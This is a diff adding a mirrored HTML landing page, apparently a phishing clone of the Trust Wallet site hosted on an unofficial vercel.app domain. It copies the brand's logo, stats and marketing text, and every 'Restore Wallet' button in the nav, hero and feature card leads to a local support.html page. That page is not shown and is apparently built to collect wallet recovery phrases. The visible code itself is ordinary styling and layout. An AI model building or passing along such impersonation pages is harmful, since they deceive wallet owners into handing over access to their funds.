@@ -1,0 +1,951 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from restoretrust-pageweb.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 25 Jan 2025 16:51:48 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trust Wallet</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="../cdn.jsdelivr.net/npm/bootstrap%405.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link href="New%20logo%2032%20x32.png"/>
+        <link href="New%20logo%2032%20x32.png"/>
+</head>
+<body>
+    <nav>
+        <div class="nav-container">
+            <div class="logo">
+                <img src="trustlogo-removebg-preview.png" alt="Trust Wallet Logo" width="auto" height="60">
+                <!-- <span>TRUST</span> -->
+            </div>
+            <div class="menu">
+                <a href="#">Wallet</a>
+                <a href="#">Features</a>
+                <a href="#">Build</a>
+                <a href="#">Support</a>
+                <a href="#">About</a>
+            </div>
+            <div class="actions">
+                <!-- <button class="btn btn-outline">Language</button> -->
+                <a href="support.html" class="custom-btn">
+                    Restore Wallet
+                  </a>
+            </div>
+            <button class="menu-toggle" aria-label="Toggle menu">
+                <i data-lucide="menu"></i>
+            </button>
+        </div>
+    </nav>
+
+    <main>
+        <section class="hero">
+            <div class="hero-content">
+                <h1>True crypto ownership.<br>Powerful Web3<br>experiences</h1>
+                <p>Unlock the power of your cryptocurrency assets and explore the world of Web3 with Trust Wallet.</p>
+                <style>
+                    .custom-btn {
+                      display: inline-flex;
+                      align-items: center;
+                      justify-content: center;
+                      border: 2px solid #0000FF;
+                      border-radius: 50px;
+                      color: #0000FF;
+                      font-weight: 500;
+                      font-size: 16px;
+                      padding: 10px 20px;
+                      text-decoration: none;
+                      transition: all 0.3s;
+                    }
+
+                    .custom-btn2 {
+                      display: inline-flex;
+                      align-items: center;
+                      justify-content: center;
+                      border: 2px solid #0000FF;
+                      border-radius: 50px;
+                      color: #0000FF;
+                      font-weight: 500;
+                      font-size: 16px;
+                      padding: 10px 20px;
+                      text-decoration: none;
+                      transition: all 0.3s;
+                    }
+                
+                    .custom-btn:hover {
+                      background-color: #0000FF;
+                      color: #FFFFFF;
+                    }
+                
+                    .custom-btn-icon {
+                      display: inline-block;
+                      margin-right: 8px;
+                      font-size: 18px;
+                      border-radius: 2px;
+                      padding: 3px 5px;
+                    }
+
+                    .svg-icon:hover{
+                        color: #FFFFFF;
+                    }
+                  </style>
+                <div class="cta-buttons d-flex justify-content-center align-items-center ">  
+                      <div>
+                        <!-- <a href="#" class="custom-btn">
+                          <span class="custom-btn-icon">📱</span>
+                          Restore wallet
+                        </a> -->
+                        <a href="support.html" class="custom-btn ms-3">
+                          Restore Wallet
+                        </a>
+                      </div>
+                    
+                      <script src="../cdn.jsdelivr.net/npm/bootstrap%405.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+                </div>
+            </div>
+            <div class="hero-image">
+                <img src="Screenshot_2024-12-16_at_17.21.41-removebg-preview.png" alt="Trust Wallet Interface">
+            </div>
+        </section>
+
+        <section class="stats">
+            <div class="stat-item">
+                <p>Trusted by</p>
+                <p class="highlight">140M</p>
+                <p>people</p>
+            </div>
+            <div class="stat-item">
+                <p>Founded in</p>
+                <p class="highlight">2017</p>
+            </div>
+            <div class="stat-item">
+                <p>Independently</p>
+                <p class="highlight">Audited</p>
+            </div>
+            <div class="stat-item">
+                <p>ISO</p>
+                <p class="highlight">Certified</p>
+            </div>
+            <div class="stat-item">
+                <p>Top reviews</p>
+                <div class="stars">
+                    <i data-lucide="star"></i>
+                    <i data-lucide="star"></i>
+                    <i data-lucide="star"></i>
+                    <i data-lucide="star"></i>
+                    <i data-lucide="star"></i>
+                </div>
+            </div>
+        </section>
+
+        <section class="platform">
+            <style>
+                /* Global Styles */
+
+                * {
+                    margin: 0;
+                    padding: 0;
+                    box-sizing: border-box;
+                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+                }
+        
+                body {
+                    line-height: 1.5;
+                }
+        
+                /* Header Styles */
+                .header {
+                    display: flex;
+                    justify-content: space-between;
+                    align-items: center;
+                    padding: 1rem 2rem;
+                    position: fixed;
+                    width: 100%;
+                    background: white;
+                    z-index: 1000;
+                }
+        
+                .logo {
+                    display: flex;
+                    align-items: center;
+                    gap: 0.5rem;
+                }
+        
+                .logo img {
+                    height: 32px;
+                }
+        
+                .nav-links {
+                    display: flex;
+                    gap: 2rem;
+                    align-items: center;
+                }
+        
+                .nav-links a {
+                    text-decoration: none;
+                    color: #333;
+                }
+        
+                /* Platform Section Styles */
+                .platform-section {
+                    background: linear-gradient(135deg, #2196f3, #1565c0);
+                    color: white;
+                    padding: 4rem 2rem;
+                    text-align: center;
+                    margin-top: 64px;
+                }
+        
+                .platform-section h1 {
+                    font-size: 2.5rem;
+                    margin-bottom: 1rem;
+                }
+        
+                .platform-section p {
+                    max-width: 600px;
+                    margin: 0 auto 2rem;
+                }
+        
+                /* Chain Table Styles */
+                .chain-table {
+                    background: white;
+                    border-radius: 12px;
+                    padding: 1rem;
+                    max-width: 800px;
+                    margin: 0 auto;
+                }
+        
+                .chain-row {
+                    display: grid;
+                    grid-template-columns: 2fr repeat(5, 1fr);
+                    align-items: center;
+                    padding: 1.75rem;
+                    border-bottom: 1px solid #eee;
+                }
+        
+                .chain-header {
+                    font-weight: bold;
+                }
+        
+                .chain-icon {
+                    width: 24px;
+                    height: 24px;
+                    margin-right: .5rem;
+                }
+        
+                .chain-name {
+                    display: flex;
+                    align-items: center;
+                }
+
+                .chain-name span {
+    color: black; /* Sets the chain name text color to black */
+    font-weight: bold; /* Optional: Makes the text bold */
+    font-size: 16px; /* Optional: Adjusts the font size */
+}
+        
+                .check-icon {
+                    color: #2196f3;
+                    font-size: 1.2rem;
+                }
+        
+                /* Stats Section */
+                .stats-section {
+                    display: inline-flex;
+                    grid-template-columns: repeat(3, 1fr);
+                    max-width: 800px;
+                    margin: 2rem auto;
+                    gap: 2rem;
+                    text-align: center;
+                    color: white;
+                }
+        
+                .stat-item h3 {
+                    font-size: 2rem;
+                    margin-bottom: 0.5rem;
+                }
+        
+                /* Responsive Design */
+                @media (max-width: 768px) {
+                    .chain-row {
+                        grid-template-columns: 2fr repeat(3, 1fr);
+                    }
+                    
+                    .stats-section {
+                        grid-template-columns: 1fr;
+                    }
+                    .mobile-text-center {
+            text-align: center;
+            display: grid;
+        }
+                }
+            </style>
+        
+            <!-- Platform Section -->
+                <h1>One Platform, Millions of Assets</h1>
+                <p>As a leading self-custody multi-chain platform, we support millions of assets across 100+ blockchains. From Bitcoin, Ethereum, and Solana, to Cosmos, Optimism, and much more.</p>
+                
+                <div class="chain-table">
+                    <div class="chain-row chain-header">
+                        <div>Chain</div>
+                        <div>Buy</div>
+                        <div>Sell</div>
+                        <div>Swap</div>
+                        <div>Earn</div>
+                        <div>dApps</div>
+                    </div>
+                    <!-- Chain rows will be populated by JavaScript -->
+                </div>
+        
+                <div class="stats-section">
+                    <div class="stat-item mobile-text-center">
+                        <h3>10M+</h3>
+                        <p>Assets</p>
+                    </div>
+                    <div class="stat-item">
+                        <h3>600M+</h3>
+                        <p>NFTs</p>
+                    </div>
+                    <div class="stat-item">
+                        <h3>100+</h3>
+                        <p>Blockchains</p>
+                    </div>
+                </div>
+        
+            <style>
+        .chain-table {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr 1fr 1fr 1fr; /* Adjust based on feature count */
+            gap: 10px;
+            align-items: center;
+            margin-top: 20px;
+        }
+        .chain-row {
+            display: contents;
+        }
+        .chain-name {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #0000;
+        }
+        .chain-icon {
+            width: 30px;
+            height: 30px;
+            object-fit: contain;
+        }
+        .check-icon {
+            color: green;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="chain-table"></div>
+
+    <script>
+        const chains = [
+            {
+                name: 'BNB Smart Chain (BNB)',
+                icon: 'bnblogo.avif', // Update with correct path
+                features: [true, true, true, true, true]
+            },
+            {
+                name: 'Bitcoin (BTC)',
+                icon: 'btclogo.avif', // Update with correct path
+                features: [true, true, false, false, false]
+            },
+            {
+                name: 'Cosmos (ATOM)',
+                icon: 'atomlogo.avif', // Update with correct path
+                features: [true, true, true, true, true]
+            },
+            {
+                name: 'Ethereum (ETH)',
+                icon: 'ethlogo.avif', // Update with correct path
+                features: [true, true, true, true, true]
+            },
+        ];
+
+        const tableContainer = document.querySelector('.chain-table');
+        
+        chains.forEach(chain => {
+            const row = document.createElement('div');
+            row.className = 'chain-row';
+            
+            const nameCell = document.createElement('div');
+            nameCell.className = 'chain-name';
+            nameCell.innerHTML = `
+                <img src="${chain.icon || 'images/default-icon.svg'}" 
+                     class="chain-icon" 
+                     alt="${chain.name}" 
+                     onerror="this.src='images/default-icon.html';">
+                <span>${chain.name}</span>
+            `;
+            row.appendChild(nameCell);
+
+            chain.features.forEach(feature => {
+                const cell = document.createElement('div');
+                cell.innerHTML = feature ? '✓' : '×';
+                cell.className = feature ? 'check-icon' : '';
+                row.appendChild(cell);
+            });
+
+            tableContainer.appendChild(row);
+        });
+    </script>
+        </section>
+
+        <style>
+            .seamless-section {
+                background: linear-gradient(180deg, #FFF3B1, #FFF0B4, #FFEEB7, #FCE9B7, #D9C7A2, #f2dfbd, #deaec3, #deaec3, #F0D3BC, #deaec3);
+                padding: 4rem 2rem;
+                text-align: center;
+                border-radius: 15px;
+            }
+    
+            .seamless-content {
+                max-width: 1200px;
+                margin: 0 auto;
+            }
+    
+            .seamless-title {
+                font-size: 2.5rem;
+                margin-bottom: 1rem;
+            }
+    
+            .seamless-description {
+                color: #666;
+                margin-bottom: 3rem;
+            }
+    
+            .feature-card {
+                background: white;
+                border-radius: 16px;
+                padding: 2rem;
+                margin: 2rem auto;
+                max-width: 800px;
+                display: grid;
+                grid-template-columns: 1fr 1fr;
+                gap: 2rem;
+                text-align: left;
+                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            }
+    
+            .feature-content {
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+            }
+    
+            .feature-title {
+                font-size: 1.5rem;
+                margin-bottom: 1rem;
+            }
+    
+            .feature-description {
+                color: #666;
+                margin-bottom: 1.5rem;
+            }
+    
+            .feature-button {
+                background: #2196f3;
+                color: white;
+                border: none;
+                padding: 0.75rem 1.5rem;
+                border-radius: 8px;
+                cursor: pointer;
+                display: inline-block;
+                text-decoration: none;
+                font-weight: 500;
+            }
+    
+            .feature-image {
+                width: 100%;
+                height: auto;
+                object-fit: cover;
+                border-radius: 8px;
+            }
+    
+            @media (max-width: 768px) {
+                .feature-card {
+                    grid-template-columns: 1fr;
+                }
+            }
+        </style>
+    
+        <div class="seamless-content seamless-section">
+            <h2 class="seamless-title">Simple. Seamless.</h2>
+            <p class="seamless-description">
+                Enjoy a smooth mobile app and desktop experience with easy-to-use, powerful tools to
+                support your entire Web3 journey.
+            </p>
+    
+            <div class="feature-card">
+                <div class="feature-content">
+                    <h3 class="feature-title">Deposit crypto easily from exchanges</h3>
+                    <p class="feature-description">
+                        Take control of your crypto. Avoid complicated steps and deposit directly to your wallet from exchanges
+                        like Binance and Coinbase.
+                    </p>
+                    <a href="support.html" class="custom-btn ms-3">
+                        Restore Wallet
+                      </a>
+                </div>
+                <img src="handstuff.svg" alt="Mobile app interface" class="feature-image">
+            </div>
+        </div>
+    </section>
+
+    <style>
+        .security-section {
+            background: linear-gradient(180deg, #CFD268, #D7DF63, #D9E869, #acea90, #b5ef9a, #aee794, #89e65e, #79d84c, #89e65e, #6add35);
+            padding: 4rem 2rem;
+            text-align: center;
+        }
+
+        .security-content {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .security-title {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .security-description {
+            color: #666;
+            max-width: 600px;
+            margin: 0 auto 3rem;
+        }
+
+        .security-features {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 2rem;
+            margin-top: 2rem;
+        }
+
+        .security-card {
+            background: white;
+            border-radius: 16px;
+            padding: 2rem;
+            text-align: left;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .security-card-icon {
+            width: 200px;
+            height: 200px;
+            margin-bottom: 1rem;
+        }
+
+        .security-card-icon2 {
+            width: 150px;
+            height: 150px;
+            margin-bottom: 1rem;
+        }
+
+        .security-card-title {
+            font-size: 1.25rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .security-card-description {
+            color: #666;
+            font-size: 0.9rem;
+        }
+
+        .main-security-card {
+            grid-column: 1 / -1;
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 2rem;
+            align-items: center;
+        }
+
+        .security-button {
+            background: #2196f3;
+            color: white;
+            border: none;
+            padding: 0.75rem 1.5rem;
+            border-radius: 8px;
+            cursor: pointer;
+            display: inline-block;
+            text-decoration: none;
+            font-weight: 500;
+            margin-top: 1rem;
+        }
+
+        @media (max-width: 768px) {
+            .security-features {
+                grid-template-columns: 1fr;
+            }
+
+            .main-security-card {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+
+    <div class="security-content security-section">
+        <h2 class="security-title">Stay private and secure</h2>
+        <p class="security-description">
+            Rest easy knowing that our privacy and security measures keep you in control of your data
+            and digital assets, while also keeping them safe.
+        </p>
+
+        <div class="security-features">
+            <div class="main-security-card security-card">
+                <div>
+                    <h3 class="security-card-title">True ownership of your crypto assets</h3>
+                    <p class="security-card-description">
+                        We secure your wallet, but don't control or have access to your private keys or secret phrase - only
+                        you do.
+                    </p>
+                    <a href="https://apps.apple.com/app/apple-store/id1288339409?mt=8" class="custom-btn ms-3">
+                        Get Started
+                      </a>
+                </div>
+                <img src="Lock.svg" alt="Security illustration" class="security-card-icon">
+            </div>
+
+            <div class="security-card">
+                <img src="cloud.svg" alt="Encryption" class="security-card-icon2">
+                <h3 class="security-card-title">Added security with encryption</h3>
+                <p class="security-card-description">
+                    Use our Encrypted Cloud Backup for increased wallet security.
+                </p>
+            </div>
+
+            <div class="security-card">
+                <img src="shireld.svg" alt="Privacy" class="security-card-icon2">
+                <h3 class="security-card-title">Zero personal tracking</h3>
+                <p class="security-card-description">
+                    We don't track any personal information, including your IP address or balances.
+                </p>
+            </div>
+
+            <div class="security-card">
+                <img src="trumpet.svg" alt="Alerts" class="security-card-icon2">
+                <h3 class="security-card-title">Proactive alerts for risky transactions</h3>
+                <p class="security-card-description">
+                    Stay safe with alerts for risky address and dApp connections.
+                </p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<style>
+    /* Global Styles */
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    }
+
+    /* Community Section */
+    .community-section {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 4rem 2rem;
+    }
+
+    .testimonials-grid {
+        display: grid;
+        grid-template-columns: repeat(4, 1fr);
+        gap: 2rem;
+        margin-bottom: 2rem;
+    }
+
+    .testimonial-card {
+        text-align: left;
+    }
+
+    .testimonial-image {
+        width: 100%;
+        aspect-ratio: 1;
+        object-fit: cover;
+        border-radius: 8px;
+        margin-bottom: 1rem;
+    }
+
+    .testimonial-name {
+        font-weight: 600;
+        margin-bottom: 0.5rem;
+    }
+
+    .testimonial-text {
+        color: #666;
+        font-size: 0.9rem;
+        line-height: 1.5;
+    }
+
+    .telegram-button {
+        display: inline-block;
+        background: #0066ff;
+        color: white;
+        text-decoration: none;
+        padding: 0.75rem 2rem;
+        border-radius: 50px;
+        font-weight: 500;
+        margin: 2rem 0;
+    }
+
+    /* Building on Trust Section */
+    .building-section {
+        background: #0000FF;
+        color: white;
+        padding: 4rem 2rem;
+        border-radius: 16px;
+        margin: 2rem auto;
+        max-width: 1200px;
+        display: grid;
+        grid-template-columns: 2fr 1fr;
+        align-items: center;
+        gap: 2rem;
+    }
+
+    .building-content h2 {
+        font-size: 2.5rem;
+        margin-bottom: 1rem;
+    }
+
+    .building-content p {
+        margin-bottom: 2rem;
+        opacity: 0.9;
+        line-height: 1.6;
+    }
+
+    .docs-button {
+        background: white;
+        color: #0066ff;
+        text-decoration: none;
+        padding: 0.75rem 2rem;
+        border-radius: 50px;
+        font-weight: 500;
+        display: inline-block;
+    }
+
+    .robot-icon {
+        width: 137px;
+        height: 220px;
+        justify-self: end;
+    }
+
+    /* Footer Styles */
+    .footer {
+        background: #f8f9fa;
+        padding: 4rem 2rem;
+        margin-top: 4rem;
+    }
+
+    .footer-content {
+        max-width: 1200px;
+        margin: 0 auto;
+    }
+
+    .footer-logo {
+        width: 120px;
+        margin-bottom: 2rem;
+    }
+
+    .footer-grid {
+        display: grid;
+        grid-template-columns: repeat(5, 1fr);
+        gap: 2rem;
+        margin-bottom: 3rem;
+    }
+
+    .footer-column h3 {
+        font-size: 1rem;
+        margin-bottom: 1rem;
+        color: #333;
+    }
+
+    .footer-links {
+        list-style: none;
+    }
+
+    .footer-links li {
+        margin-bottom: 0.5rem;
+    }
+
+    .footer-links a {
+        color: #666;
+        text-decoration: none;
+        font-size: 0.9rem;
+    }
+
+    .download-section {
+        margin-bottom: 2rem;
+    }
+
+    .download-title {
+        font-size: 0.9rem;
+        color: #666;
+        margin-bottom: 1rem;
+    }
+
+    .download-buttons {
+        display: grid;
+        grid-template-columns: repeat(2, 1fr);
+        gap: 1rem;
+        max-width: 400px;
+    }
+
+    .download-button {
+        background: white;
+        border: 1px solid #ddd;
+        padding: 0.5rem 1rem;
+        border-radius: 8px;
+        text-decoration: none;
+        color: #333;
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+        font-size: 0.9rem;
+    }
+
+    .social-links {
+        display: flex;
+        gap: 1rem;
+    }
+
+    .social-icon {
+        width: 24px;
+        height: 24px;
+        color: #666;
+    }
+
+    @media (max-width: 768px) {
+        .testimonials-grid {
+            grid-template-columns: 1fr;
+        }
+
+        .building-section {
+            grid-template-columns: 1fr;
+            text-align: center;
+        }
+
+        .robot-icon {
+            justify-self: center;
+            order: -1;
+            height: 190px;
+            width: 137px;
+        }
+
+        .footer-grid {
+            grid-template-columns: repeat(2, 1fr);
+        }
+
+        .download-buttons {
+            grid-template-columns: 1fr;
+        }
+    }
+</style>
+</head>
+<body>
+
+<!-- Building on Trust Section -->
+<section class="building-section">
+    <div class="building-content">
+        <h2>Building on Trust</h2>
+        <p>We know that working together as a community is better for everyone. Our platform enables blockchain developers to build their dApps and wallets natively and connect with millions of users, without having to worry about the low-level implementation details.</p>
+        <a href="https://developer.trustwallet.com/developer/" class="docs-button">Check out our Developer Docs</a>
+    </div>
+    <img src="helmet.svg" alt="" height="270px" width="137px" class="robot-icon">
+</section>
+
+<!-- Footer -->
+<footer class="footer">
+    <div class="footer-content">
+        <img src="trustlogo-removebg-preview.png" alt="Trust Wallet" class="footer-logo">
+        
+        <div class="footer-grid">
+            <div class="footer-column">
+                <h3 style="font-weight: 800;">Wallet</h3>
+                <ul class="footer-links">
+                    <li><a href="#">Mobile App</a></li>
+                    <li><a href="#">Browser Extension</a></li>
+                </ul>
+            </div>
+            <div class="footer-column">
+                <h3 style="font-weight: 800;">Features</h3>
+                <ul class="footer-links">
+                    <li><a href="#">Buy Crypto</a></li>
+                    <li><a href="#">Swaps</a></li>
+                    <li><a href="#">Staking</a></li>
+                    <li><a href="#">NFTs</a></li>
+                    <li><a href="#">Security</a></li>
+                </ul>
+            </div>
+            <div class="footer-column">
+                <h3 style="font-weight: 800;">Build</h3>
+                <ul class="footer-links">
+                    <li><a href="#">Developer Docs</a></li>
+                    <li><a href="#">Wallet Core</a></li>
+                    <li><a href="#">Submit dApp</a></li>
+                    <li><a href="#">Get assets listed</a></li>
+                </ul>
+            </div>
+            <div class="footer-column">
+                <h3 style="font-weight: 800;">Support</h3>
+                <ul class="footer-links">
+                    <li><a href="#">FAQ</a></li>
+                    <li><a href="#">Community Forum</a></li>
+                    <li><a href="#">Contact Us</a></li>
+                </ul>
+            </div>
+            <div class="footer-column">
+                <h3 style="font-weight: 800;">About</h3>
+                <ul class="footer-links">
+                    <li><a href="#">About Us</a></li>
+                    <li><a href="#">Careers</a></li>
+                    <li><a href="#">Press Kit</a></li>
+                    <li><a href="#">Terms of Service</a></li>
+                    <li><a href="#">Privacy Policy</a></li>
+                    <li><a href="#">Blog</a></li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="download-section">
+            <p class="download-title" style="font-weight: 800;">Download Trust Wallet</p>
+            <p class="download-subtitle">The most trusted & secure crypto wallet.</p>
+            <div class="download-buttons">
+                <a href="https://apps.apple.com/app/apple-store/id1288339409?mt=8" class="custom-btn">
+                    <img class="custom-btn-icon svg-icon" src="applelogo.svg" alt="APK">
+                    Download ios
+                  </a>
+
+                <a href="https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp" class="custom-btn">
+                    Download Apk  
+                    <img class="custom-btn-icon svg-icon" src="androidicon.svg" alt="Android">
+                </a>
+            </div>
+        </div>
+
+        <div class="social-section">
+            <p>Stay Connected:</p>
+            <div class="social-links">
+                <a href="#"><img src="facebook.svg" alt="Facebook" class="social-icon"></a>
+                <a href="#"><img src="twitter.svg" alt="Twitter" class="social-icon"></a>
+                <a href="#"><img src="instagram.svg" alt="Instagram" class="social-icon"></a>
+                <a href="#"><img src="github.svg" alt="Instagram" class="social-icon"></a>
+            </div>
+        </div>
+    </div>
+</footer>
+    </main>
+
+
+    <script src="script.js"></script>
+</body>
+
+<!-- Mirrored from restoretrust-pageweb.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 25 Jan 2025 16:56:19 GMT -->
+</html>
+
